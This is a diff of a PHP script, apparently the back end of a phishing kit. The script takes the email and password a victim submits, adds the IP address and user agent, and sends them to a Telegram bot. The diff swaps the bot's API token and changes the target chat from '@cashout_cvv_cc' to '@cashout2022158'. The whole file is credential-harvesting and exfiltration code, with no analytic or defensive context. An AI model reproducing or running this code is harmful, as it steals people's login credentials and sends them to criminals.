@@ -6,11 +6,11 @@ $email=$_POST['email'];
 $password=$_POST['password'];
 $nl="\r\n";
 $message = 'EMAIL: ' . $email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
-$apiToken = "5697191099:AAHko1fs2sO9KSca1q4cqcgkynukya9NQ1Q";
+$apiToken = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
 
 $data = [
-    'chat_id' => '@cashout_cvv_cc',
-    'text' => '$message'
+    'chat_id' => '@cashout2022158',
+    'text' => 'hello'
 ];
 
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
